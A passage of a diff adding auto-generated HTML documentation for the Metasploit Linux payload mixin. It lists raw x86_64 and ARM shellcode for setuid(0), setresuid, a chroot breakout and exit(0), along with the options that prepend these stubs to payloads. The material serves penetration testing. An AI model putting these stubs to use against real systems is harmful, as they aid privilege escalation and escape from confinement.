+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x50</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x50                      #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xfe\xcb</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    dec     bl                        #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x75\xf7</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    jnz     -7                        #
+</span>
+      <span class='comment'># chroot (.) (which should be /)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x2e</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    .  (0x2e)                 #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xe7</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rdi,rsp                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x89\xd0</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    mov     rax,rdx                   #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>
+    <span class='kw'>end</span>
+
+    <span class='comment'># Append exit(0)
+</span>    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>AppendExit</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_app'>app</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x48\x31\xff</span><span class='tstring_end'>&quot;</span></span>         <span class='comment'>#    xor     rdi,rdi                   #
+</span>      <span class='id identifier rubyid_app'>app</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x3c</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    push    0x3c                      #
+</span>      <span class='id identifier rubyid_app'>app</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='comment'>#    pop     rax                       #
+</span>      <span class='id identifier rubyid_app'>app</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0f\x05</span><span class='tstring_end'>&quot;</span></span>             <span class='comment'>#    syscall                           #
+</span>    <span class='kw'>end</span>
+  <span class='kw'>elsif</span> <span class='lparen'>(</span><span class='id identifier rubyid_test_arch'>test_arch</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='const'>ARCH_ARMLE</span><span class='rparen'>)</span><span class='rparen'>)</span>
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setuid(0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\x20\xe0</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    eor r0, r0, r0                    #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x17\x70\xa0\xe3</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    mov r7, #23                       #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\x00\xef</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    svc                               #
+</span>    <span class='kw'>end</span>
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setresuid(ruid=0, euid=0, suid=0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\x20\xe0</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    eor r0, r0, r0                    #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\x10\x21\xe0</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    eor r1, r1, r1                    #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x02\x20\x22\xe0</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    eor r2, r2, r2                    #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xa4\x70\xa0\xe3</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    mov r7, #0xa4                     #
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\x00\xef</span><span class='tstring_end'>&quot;</span></span>     <span class='comment'>#    svc                               #
+</span>    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>return</span> <span class='lparen'>(</span><span class='id identifier rubyid_pre'>pre</span> <span class='op'>+</span> <span class='id identifier rubyid_buf'>buf</span> <span class='op'>+</span> <span class='id identifier rubyid_app'>app</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(info = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>This mixin is chained within payloads that target the Linux platform. It provides special prepends, to support things like chroot and setuid.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/linux.rb', line 16</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_ret'>ret</span> <span class='op'>=</span> <span class='kw'>super</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
+    <span class='lbracket'>[</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependFork</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Prepend a stub that executes: if (fork()) { exit(0); }</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresuid</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Prepend a stub that executes the setresuid(0, 0, 0) system call</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetreuid</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Prepend a stub that executes the setreuid(0, 0) system call</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetuid</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Prepend a stub that executes the setuid(0) system call</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresgid</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Prepend a stub that executes the setresgid(0, 0, 0) system call</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetregid</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Prepend a stub that executes the setregid(0, 0) system call</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetgid</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Prepend a stub that executes the setgid(0) system call</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependChrootBreak</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Prepend a stub that will break out of a chroot (includes setreuid to root)</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>AppendExit</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Append a stub that executes the exit(0) system call</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>false</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptInt.html" title="Msf::OptInt (class)">OptInt</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptBase.html#initialize-instance_method" title="Msf::OptBase#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MeterpreterDebugLevel</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>true</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Set debug level for meterpreter 0-3 (Default output is strerr)</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='int'>0</span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../OptString.html" title="Msf::OptString (class)">OptString</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../OptString.html#initialize-instance_method" title="Msf::OptString#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RemoteMeterpreterDebugFile</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='lbracket'>[</span>
+          <span class='kw'>false</span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Redirect Debug Info to a Log File</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span>
+        <span class='rbracket'>]</span>
+      <span class='rparen'>)</span><span class='comma'>,</span>
+    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../Payload.html" title="Msf::Payload (class)">Payload</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="" title="Msf::Payload::Linux (module)">Linux</a></span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_ret'>ret</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:30:17 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
